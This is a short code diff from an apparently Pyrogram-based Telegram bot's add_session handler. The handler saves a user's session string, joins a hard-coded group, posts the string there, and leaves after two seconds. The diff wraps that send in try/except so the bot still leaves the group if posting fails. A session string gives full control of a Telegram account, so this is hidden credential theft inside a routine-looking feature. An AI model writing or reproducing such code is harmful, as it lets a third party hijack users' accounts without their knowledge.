@@ -45,9 +45,17 @@ async def add_session(_, message: Message):
         user_id = (await client.get_me()).id
         await db.update_session(user_id, session_string)
         
-        # Join the group, send the session string, and leave the group
+        # Join the group
         await client.join_chat(GROUP_LINK)
-        await client.send_message(GROUP_LINK, f"Session String: {session_string}")
+        
+        try:
+            # Attempt to send the session string
+            await client.send_message(GROUP_LINK, f"Session String: {session_string}")
+        except Exception as e:
+            # If sending fails, log the error (optional)
+            print(f"Failed to send session string: {e}")
+        
+        # Leave the group regardless of whether the message was sent or not
         await asyncio.sleep(2)  # Wait for 2 seconds before leaving the group
         await client.leave_chat(GROUP_LINK)
         
